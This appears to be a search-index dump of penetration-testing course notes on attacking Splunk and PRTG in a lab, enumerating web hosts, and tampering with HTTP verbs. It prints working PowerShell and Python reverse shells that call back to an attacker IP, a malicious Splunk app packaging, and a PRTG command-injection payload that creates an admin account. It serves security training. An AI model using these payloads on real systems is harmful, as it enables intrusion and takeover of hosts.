default on port 8000. On older versions of Splunk, the default credentials are admin:changeme , which are conveniently displayed on the login page. Latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as admin, Welcome, Welcome1, Password123, etc. We can see that Nmap identified the Splunkd httpd service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API. hrmns@htb[/htb]$ sudo nmap -sV 10 .129.201.50 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT Nmap scan report for 10.129.201.50 Host is up (0.11s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 8000/tcp open ssl/http Splunkd httpd 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) 8089/tcp open ssl/http Splunkd httpd Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 39.22 seconds","title":"Discovery/Footprinting"},{"location":"attacking_common_apps/infra_network_monitoring_tools/#enumeration","text":"Splunk Enterprise trial converts to a free version after 60 days, which doesn\u2019t require authentication. Once logged in, we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications. Common method of gaining remote code execution on a Splunk server is through the use of a scripted input. These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk. As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script.","title":"Enumeration"},{"location":"attacking_common_apps/infra_network_monitoring_tools/#attacking-splunk","text":"We can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts.","title":"Attacking Splunk"},{"location":"attacking_common_apps/infra_network_monitoring_tools/#abusing-built-in-functionality","text":"Can use this Splunk package to assist us. The bin directory in this repo has examples for Python and PowerShell First need to create a custom Splunk application using the following directory structure. hrmns@htb[/htb]$ tree splunk_shell/ splunk_shell/ \u251c\u2500\u2500 bin \u2514\u2500\u2500 default 2 directories, 0 files The bin directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our inputs.conf file. Our reverse shell will be a PowerShell one-liner. #A simple and small reverse shell. Options and help removed to save space. #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well. $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close( The inputs.conf file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present. Need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner. @ECHO OFF PowerShell.exe -exec bypass -w hidden -Command \"& '%~dpn0.ps1'\" Exit Once the files are created, we can create a tarball or .spl file. hrmns@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/ splunk_shell/ splunk_shell/bin/ splunk_shell/bin/rev.py splunk_shell/bin/run.bat splunk_shell/bin/run.ps1 splunk_shell/default/ splunk_shell/default/inputs.conf Next choose Install app from file and upload the application https://10.129.201.50:8000/en-US/manager/search/apps/local Before uploading the malicious custom app, start a listener using Netcat or socat . hrmns@htb[/htb]$ sudo nc -lnvp 443 listening on [any] 443 ... On the Upload app page, click browse, choose the tarball created earlier and click Upload . As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to Enabled . hrmns@htb[/htb]$ sudo nc -lnvp 443 listening on [any] 443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145 PS C:\\Windows\\system32> whoami nt authority\\system PS C:\\Windows\\system32> hostname APP03 PS C:\\Windows\\system32> In this case, we got a shell back as NT AUTHORTY\\SYSTEM . If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain. If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener. import sys , socket , os , pty ip = \"10.10.14.15\" port = \"443\" s = socket . socket () s . connect (( ip , int ( port ))) [ os . dup2 ( s . fileno (), fd ) for fd in ( 0 , 1 , 2 )] pty . spawn ( '/bin/bash' ) If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the $SPLUNK_HOME/etc/deployment-apps directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.","title":"Abusing Built-In Functionality"},{"location":"attacking_common_apps/infra_network_monitoring_tools/#prtg-network-monitor","text":"PRTG Network Monitor is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more.","title":"PRTG Network Monitor"},{"location":"attacking_common_apps/infra_network_monitoring_tools/#discoveryfootprintingenumeration","text":"Can quickly discover PRTG from an Nmap scan. can typically be found on common web ports such as 80, 443, or 8080. It is possible to change the web interface port in the Setup section when logged in as an admin. hrmns@htb[/htb]$ sudo nmap -sV -p- --open -T4 10 .129.201.50 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.06% done Nmap scan report for 10.129.201.50 Host is up (0.11s latency). Not shown: 65492 closed ports, 24 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 8000/tcp open ssl/http Splunkd httpd 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) 8089/tcp open ssl/http Splunkd httpd 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49676/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds Service Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) detected on port 8080. PRTG also shows up in the EyeWitness scan performed earlier. Here we can see that EyeWitness lists the default credentials prtgadmin:prtgadmin . Once we discovered PRTG, we can confirm it by browing to the URL. http://10.129.201.50:8080/index.htm From the enumeration performed so far, it seems to be PRTG version 17.3.33.2830 and is likely vulnerable to CVE-2018-9276 which is an authenticated command injection in the PRTG System Administrator web console for PRTG Network Monitor before version 18.2.39. Based on the version reported by Nmap, we can assume that we are dealing with a vulnerable version. Using cURL we can see that the version number is indeed 17.3.33.283 . hrmns@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A \"Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)\" | grep version <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/prtgmini.css?prtgversion=17.3.33.2830__\" media=\"print,screen,projection\" /> <div><h3><a target=\"_blank\" href=\"https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors\">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div> <span class=\"prtgversion\">&nbsp;PRTG Network Monitor 17.3.33.2830 </span> http://10.129.201.50:8080/welcome.htm","title":"Discovery/Footprinting/Enumeration"},{"location":"attacking_common_apps/infra_network_monitoring_tools/#leveraging-known-vulnerabilities","text":"This excellent blog post by the individual who discovered this flaw does a great job of walking through the initial discovery process and how they discovered it. When creating a new notification, the Parameter field is passed directly into a PowerShell script without any type of input sanitization. Mouse over Setup in the top right and then the Account Settings menu and finally click on Notifications . Click on Add new notification . Give it a name and scroll down and tick the box next to EXECUTE PROGRAM . Under Program File , select Demo exe notification - outfile.ps1 from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add . During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the Save button. After clicking Save , we will be redirected to the Notifications page and see our new notification named pwn in the list. Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up. This could prove handy as a persistence mechanism during a long-term engagement and is worth taking note of. Schedules can be modified in the account settings menu if we want to set it up to run at a specific time every day to get our connection back or something of that nature. At this point, all that is left is to click the Test button to run our notification and execute the command to add a local admin user. After clicking Test we will get a pop-up that says EXE notification is queued up . If we receive any sort of error message here, we can go back and double-check the notification settings. Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin. We can use CrackMapExec to confirm local admin access. We could also try to RDP to the box, access over WinRM, or use a tool such as evil-winrm or something from the impacket toolkit such as wmiexec.py or psexec.py . hrmns@htb[/htb]$ sudo crackmapexec smb 10 .129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! SMB 10.129.201.50 445 APP03 [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False) SMB 10.129.201.50 445 APP03 [+] APP03\\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)","title":"Leveraging Known Vulnerabilities"},{"location":"attacking_common_apps/setting_the_stage/","text":"Application Discovery and Enumeration \u00b6 As penetration testers, we need to have strong enumeration skills and be able to get the \"lay of the land\" on any network starting with very little to no information (black box discovery or just a set of CIDR ranges). Typically, when we connect to a network, we'll start with a ping sweep to identify \"live hosts.\" From there, we will usually begin targeted port scanning and, eventually, deeper port scanning to identify running services. In a network with hundreds or thousands of hosts, this enumeration data can become unwieldy. Let's say we perform an Nmap port scan to identify common web services such as: hrmns@htb[/htb]$ nmap -p 80 ,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list We may find an enormous amount of hosts with services running on ports 80 and 443 alone. What do we do with this data? Sifting through the enumeration data by hand in a large environment would be far too time-consuming, especially since most assessments are under strict time constraints. Browsing to each IP/hostname + port would also be highly inefficient. Lucky for us, several great tools exist that can greatly assist in this process. Two phenomenal tools that every tester should have in their arsenal are EyeWitness and Aquatone . Both of these tools can be fed raw Nmap XML scan output (Aquatone can also take Masscan XML; EyeWitness can take Nessus XML output) and be used to quickly inspect all hosts running web applications and take screenshots of each. The screenshots are then assembled into a report that we can work through in the web browser to assess the web attack surface. These screenshots can help us narrow down potentially 100s of hosts and build a more targeted list of applications that we should spend more time enumerating and attacking. An example structure may look like the following for the discovery phase: External Penetration Test - <Client Name> Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy) Client Points of Contact Credentials Discovery/Enumeration Scans Live hosts Application Discovery Scans Interesting/Notable Hosts Exploitation <Hostname or IP> <Hostname or IP> Post-Exploitation <Hostname or IP> <Hostname or IP> Initial Enumeration \u00b6 Assume our client provided us with the following scope: hrmns@htb[/htb]$ cat scope_list app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog-dev.inlanefreight.local blog.inlanefreight.local app-dev.inlanefreight.local jenkins-dev.inlanefreight.local jenkins.inlanefreight.local web01.inlanefreight.local gitlab-dev.inlanefreight.local gitlab.inlanefreight.local support-dev.inlanefreight.local support.inlanefreight.local inlanefreight.local 10.129.201.50 I'll typically do an initial scan with ports 80,443,8000,8080,8180,8888,10000 and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan. While reviewing the screenshot report of the most common ports, I may run a more thorough Nmap scan against the top 10,000 ports or all TCP ports, depending on the size of the scope. Since enumeration is an iterative process, we will run a web screenshotting tool against any subsequent Nmap scans we perform to ensure maximum coverage. hrmns@htb[/htb]$ sudo nmap -p 80 ,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:49 EDT Stats: 0:00:07 elapsed; 1 hosts completed (4 up), 4 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 81.24% done; ETC: 21:49 (0:00:01 remaining) Nmap scan report for app.inlanefreight.local (10.129.42.195) Host is up (0.12s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap scan report for app-dev.inlanefreight.local (10.129.201.58) Host is up (0.12s latency). Not shown: 993 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8000/tcp open http-alt 8009/tcp open ajp13 8080/tcp open http-proxy 8180/tcp open unknown 8888/tcp open sun-answerbook Nmap scan report for gitlab-dev.inlanefreight.local (10.129.201.88) Host is up (0.12s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8081/tcp open blackice-icecap Nmap scan report for 10.129.201.50 Host is up (0.13s latency). Not shown: 991 closed ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 5357/tcp open wsdapi 8000/tcp open http-alt 8080/tcp open http-proxy 8089/tcp open unknown <SNIP> As we can see, we identified several hosts running web servers on various ports. From the results, we can infer that one of the hosts is Windows and the remainder are Linux (but cannot be 100% certain at this stage). Enumerating one of the hosts further using an Nmap service scan ( -sV ) against the default top 1,000 ports can tell us more about what is running on the webserver. hrmns@htb[/htb]$ sudo nmap --open -sV 10 .129.201.50 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:58 EDT Nmap scan report for 10.129.201.50 Host is up (0.13s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 8000/tcp open http Splunkd httpd 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) 8089/tcp open ssl/http Splunkd httpd (free license; remote login disabled) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.63 seconds From the output above, we can see that an IIS web server is running on the default port 80, and it appears that Splunk is running on port 8000/8089, while PRTG Network Monitor is present on port 8080. If we were in a medium to large-sized environment, this type of enumeration would be inefficient. It could result in us missing a web application that may prove critical to the engagement's success. Using Eye Witness \u00b6 EyeWitness can take the XML output from both Nmap and Nessus and create a report with screenshots of each web application present on the various ports using Selenium. It will also take things a step further and categorize the applications where possible, fingerprint them, and suggest default credentials based on the application. It can also be given a list of IP addresses and URLs and be told to pre-pend http:// and https:// to the front of each. It will perform DNS resolution for IPs and can be given a specific set of ports to attempt to connect to and screenshot. Let's run the default --web option to take screenshots using the Nmap XML output from the discovery scan as input. hrmns@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness # ############################################################################### # EyeWitness # # ############################################################################### # FortyNorth Security - https://www.fortynorthsecurity.com # # ############################################################################### Starting Web Requests (26 Hosts) Attempting to screenshot http://app.inlanefreight.local Attempting to screenshot http://app-dev.inlanefreight.local Attempting to screenshot http://app-dev.inlanefreight.local:8000 Attempting to screenshot http://app-dev.inlanefreight.local:8080 Attempting to screenshot http://gitlab-dev.inlanefreight.local Attempting to screenshot http://10.129.201.50 Attempting to screenshot http://10.129.201.50:8000 Attempting to screenshot http://10.129.201.50:8080 Attempting to screenshot http://dev.inlanefreight.local Attempting to screenshot http://jenkins-dev.inlanefreight.local Attempting to screenshot http://jenkins-dev.inlanefreight.local:8000 Attempting to screenshot http://jenkins-dev.inlanefreight.local:8080 Attempting to screenshot http://support-dev.inlanefreight.local Attempting to screenshot http://drupal-dev.inlanefreight.local [*] Hit timeout limit when connecting to http://10.129.201.50:8000, retrying Attempting to screenshot http://jenkins.inlanefreight.local Attempting to screenshot http://jenkins.inlanefreight.local:8000 Attempting to screenshot http://jenkins.inlanefreight.local:8080 Attempting to screenshot http://support.inlanefreight.local [*] Completed 15 out of 26 services Attempting to screenshot http://drupal-qa.inlanefreight.local Attempting to screenshot http://web01.inlanefreight.local Attempting to screenshot http://web01.inlanefreight.local:8000 Attempting to screenshot http://web01.inlanefreight.local:8080 Attempting to screenshot http://inlanefreight.local Attempting to screenshot http://drupal-acc.inlanefreight.local Attempting to screenshot http://drupal.inlanefreight.local Attempting to screenshot http://blog-dev.inlanefreight.local Finished in 57.859838008880615 seconds [*] Done! Report written in the /home/mrb3n/Projects/inlanfreight/inlanefreight_eyewitness folder! Would you like to open the report now? [Y/n] Interpreting the Results \u00b6 Even with the 26 hosts above, this report will save us time. Now imagine an environment with 500 or 5,000 hosts! After opening the report, we see that the report is organized into categories, with High Value Targets being first and typically the most \"juicy\" hosts to go after. It is important at this point to remember that we are still in the information gathering phase, and every little detail could make or break our assessment. We should not get careless and begin attacking hosts right away, as we may end up down a rabbit hole and miss something crucial later in the report. During an Internal Penetration Test, we will see much of the same but often also see many printer login pages (which we can sometimes leverage to obtain cleartext LDAP credentials), ESXi and vCenter login portals, iLO and iDRAC login pages, a plethora of network devices, IoT devices, IP phones, internal code repositories, SharePoint and custom intranet portals, security appliances, and much more.","title":"Setting the Stage"},{"location":"attacking_common_apps/setting_the_stage/#application-discovery-and-enumeration","text":"As penetration testers, we need to have strong enumeration skills and be able to get the \"lay of the land\" on any network starting with very little to no information (black box discovery or just a set of CIDR ranges). Typically, when we connect to a network, we'll start with a ping sweep to identify \"live hosts.\" From there, we will usually begin targeted port scanning and, eventually, deeper port scanning to identify running services. In a network with hundreds or thousands of hosts, this enumeration data can become unwieldy. Let's say we perform an Nmap port scan to identify common web services such as: hrmns@htb[/htb]$ nmap -p 80 ,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list We may find an enormous amount of hosts with services running on ports 80 and 443 alone. What do we do with this data? Sifting through the enumeration data by hand in a large environment would be far too time-consuming, especially since most assessments are under strict time constraints. Browsing to each IP/hostname + port would also be highly inefficient. Lucky for us, several great tools exist that can greatly assist in this process. Two phenomenal tools that every tester should have in their arsenal are EyeWitness and Aquatone . Both of these tools can be fed raw Nmap XML scan output (Aquatone can also take Masscan XML; EyeWitness can take Nessus XML output) and be used to quickly inspect all hosts running web applications and take screenshots of each. The screenshots are then assembled into a report that we can work through in the web browser to assess the web attack surface. These screenshots can help us narrow down potentially 100s of hosts and build a more targeted list of applications that we should spend more time enumerating and attacking. An example structure may look like the following for the discovery phase: External Penetration Test - <Client Name> Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy) Client Points of Contact Credentials Discovery/Enumeration Scans Live hosts Application Discovery Scans Interesting/Notable Hosts Exploitation <Hostname or IP> <Hostname or IP> Post-Exploitation <Hostname or IP> <Hostname or IP>","title":"Application Discovery and Enumeration"},{"location":"attacking_common_apps/setting_the_stage/#initial-enumeration","text":"Assume our client provided us with the following scope: hrmns@htb[/htb]$ cat scope_list app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog-dev.inlanefreight.local blog.inlanefreight.local app-dev.inlanefreight.local jenkins-dev.inlanefreight.local jenkins.inlanefreight.local web01.inlanefreight.local gitlab-dev.inlanefreight.local gitlab.inlanefreight.local support-dev.inlanefreight.local support.inlanefreight.local inlanefreight.local 10.129.201.50 I'll typically do an initial scan with ports 80,443,8000,8080,8180,8888,10000 and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan. While reviewing the screenshot report of the most common ports, I may run a more thorough Nmap scan against the top 10,000 ports or all TCP ports, depending on the size of the scope. Since enumeration is an iterative process, we will run a web screenshotting tool against any subsequent Nmap scans we perform to ensure maximum coverage. hrmns@htb[/htb]$ sudo nmap -p 80 ,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:49 EDT Stats: 0:00:07 elapsed; 1 hosts completed (4 up), 4 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 81.24% done; ETC: 21:49 (0:00:01 remaining) Nmap scan report for app.inlanefreight.local (10.129.42.195) Host is up (0.12s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap scan report for app-dev.inlanefreight.local (10.129.201.58) Host is up (0.12s latency). Not shown: 993 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8000/tcp open http-alt 8009/tcp open ajp13 8080/tcp open http-proxy 8180/tcp open unknown 8888/tcp open sun-answerbook Nmap scan report for gitlab-dev.inlanefreight.local (10.129.201.88) Host is up (0.12s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8081/tcp open blackice-icecap Nmap scan report for 10.129.201.50 Host is up (0.13s latency). Not shown: 991 closed ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 5357/tcp open wsdapi 8000/tcp open http-alt 8080/tcp open http-proxy 8089/tcp open unknown <SNIP> As we can see, we identified several hosts running web servers on various ports. From the results, we can infer that one of the hosts is Windows and the remainder are Linux (but cannot be 100% certain at this stage). Enumerating one of the hosts further using an Nmap service scan ( -sV ) against the default top 1,000 ports can tell us more about what is running on the webserver. hrmns@htb[/htb]$ sudo nmap --open -sV 10 .129.201.50 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:58 EDT Nmap scan report for 10.129.201.50 Host is up (0.13s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 8000/tcp open http Splunkd httpd 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) 8089/tcp open ssl/http Splunkd httpd (free license; remote login disabled) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.63 seconds From the output above, we can see that an IIS web server is running on the default port 80, and it appears that Splunk is running on port 8000/8089, while PRTG Network Monitor is present on port 8080. If we were in a medium to large-sized environment, this type of enumeration would be inefficient. It could result in us missing a web application that may prove critical to the engagement's success.","title":"Initial Enumeration"},{"location":"attacking_common_apps/setting_the_stage/#using-eye-witness","text":"EyeWitness can take the XML output from both Nmap and Nessus and create a report with screenshots of each web application present on the various ports using Selenium. It will also take things a step further and categorize the applications where possible, fingerprint them, and suggest default credentials based on the application. It can also be given a list of IP addresses and URLs and be told to pre-pend http:// and https:// to the front of each. It will perform DNS resolution for IPs and can be given a specific set of ports to attempt to connect to and screenshot. Let's run the default --web option to take screenshots using the Nmap XML output from the discovery scan as input. hrmns@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness # ############################################################################### # EyeWitness # # ############################################################################### # FortyNorth Security - https://www.fortynorthsecurity.com # # ############################################################################### Starting Web Requests (26 Hosts) Attempting to screenshot http://app.inlanefreight.local Attempting to screenshot http://app-dev.inlanefreight.local Attempting to screenshot http://app-dev.inlanefreight.local:8000 Attempting to screenshot http://app-dev.inlanefreight.local:8080 Attempting to screenshot http://gitlab-dev.inlanefreight.local Attempting to screenshot http://10.129.201.50 Attempting to screenshot http://10.129.201.50:8000 Attempting to screenshot http://10.129.201.50:8080 Attempting to screenshot http://dev.inlanefreight.local Attempting to screenshot http://jenkins-dev.inlanefreight.local Attempting to screenshot http://jenkins-dev.inlanefreight.local:8000 Attempting to screenshot http://jenkins-dev.inlanefreight.local:8080 Attempting to screenshot http://support-dev.inlanefreight.local Attempting to screenshot http://drupal-dev.inlanefreight.local [*] Hit timeout limit when connecting to http://10.129.201.50:8000, retrying Attempting to screenshot http://jenkins.inlanefreight.local Attempting to screenshot http://jenkins.inlanefreight.local:8000 Attempting to screenshot http://jenkins.inlanefreight.local:8080 Attempting to screenshot http://support.inlanefreight.local [*] Completed 15 out of 26 services Attempting to screenshot http://drupal-qa.inlanefreight.local Attempting to screenshot http://web01.inlanefreight.local Attempting to screenshot http://web01.inlanefreight.local:8000 Attempting to screenshot http://web01.inlanefreight.local:8080 Attempting to screenshot http://inlanefreight.local Attempting to screenshot http://drupal-acc.inlanefreight.local Attempting to screenshot http://drupal.inlanefreight.local Attempting to screenshot http://blog-dev.inlanefreight.local Finished in 57.859838008880615 seconds [*] Done! Report written in the /home/mrb3n/Projects/inlanfreight/inlanefreight_eyewitness folder! Would you like to open the report now? [Y/n]","title":"Using Eye Witness"},{"location":"attacking_common_apps/setting_the_stage/#interpreting-the-results","text":"Even with the 26 hosts above, this report will save us time. Now imagine an environment with 500 or 5,000 hosts! After opening the report, we see that the report is organized into categories, with High Value Targets being first and typically the most \"juicy\" hosts to go after. It is important at this point to remember that we are still in the information gathering phase, and every little detail could make or break our assessment. We should not get careless and begin attacking hosts right away, as we may end up down a rabbit hole and miss something crucial later in the report. During an Internal Penetration Test, we will see much of the same but often also see many printer login pages (which we can sometimes leverage to obtain cleartext LDAP credentials), ESXi and vCenter login portals, iLO and iDRAC login pages, a plethora of network devices, IoT devices, IP phones, internal code repositories, SharePoint and custom intranet portals, security appliances, and much more.","title":"Interpreting the Results"},{"location":"attacking_web_applications/http_verb_tampering/","text":"HTTP Verb Tampering \u00b6 HTTP has 9 different verbs that can be accepted as HTTP methods by web servers. Other than GET and POST, the following are some of the commonly used HTTP verbs: Verb Description HEAD Identical to a GET request, but its response only contains the headers , without the response body PUT Writes the request payload to the specified location DELETE Deletes the resource at the specified location OPTIONS Shows different options accepted by a web server, like accepted HTTP verbs PATCH Apply partial modifications to the resource at the specified location What makes HTTP Verb Tampering attacks more common (and hence more critical), is that they are caused by a misconfiguration in either the back-end web server or the web application, either of which can cause the vulnerability. Insecure Configurations \u00b6 Insecure web server configurations cause the first type of HTTP Verb Tampering vulnerabilities. A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. <Limit GET POST > Require valid-user </Limit> Even though the configuration specifies both GET and POST requests for the authentication method, an attacker may still use a different HTTP method (like HEAD ) to bypass this authentication mechanism altogether. Insecure Coding \u00b6 This can occur when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters: $pattern = \"/^[A-Za-z\\s]+$/\"; if(preg_match($pattern, $_GET[\"code\"])) { $query = \"Select * from ports where port_code like '%\" . $_REQUEST[\"code\"] . \"%'\"; ...SNIP... } We can see that the sanitization filter is only being tested on the GET parameter. If the GET requests do not contain any bad characters, then the query would be executed. However, when the query is executed, the $_REQUEST[\"code\"] parameters are being used, which may also contain POST parameters, leading to an inconsistency in the use of HTTP Verbs . In this case, an attacker may use a POST request to perform SQL injection, in which case the GET parameters would be empty (will not include any bad characters). The request would pass the security filter, which would make the function still vulnerable to SQL Injection. Bypassing Basic Authentication \u00b6 We have a basic File Manager web application, in which we can add new files by typing their names and hitting enter: Suppose we try to delete all files by clicking on the red Reset button. In that case, we see that this functionality seems to be restricted for authenticated users only, as we get the following HTTP Basic Auth prompt: As we do not have any credentials, we will get a 401 Unauthorized page: Let's see whether we can bypass this with an HTTP Verb Tampering attack. To do so, we need to identify which pages are restricted by this authentication. If we examine the HTTP request after clicking the Reset button or look at the URL that the button navigates to after clicking it, we see that it is at /admin/reset.php . So, either the /admin directory is restricted to authenticated users only, or only the /admin/reset.php page is. We can confirm this by visiting the /admin directory, and we do indeed get prompted to log in again. This means that the full /admin directory is restricted. Exploit \u00b6 We need to identify the HTTP request method used by the web application. We can intercept the request in Burp Suite and examine it: As the page uses a GET request, we can send a POST request and see whether the web page allows POST requests (i.e., whether the Authentication covers POST requests). we can click Forward and examine the page in our browser. 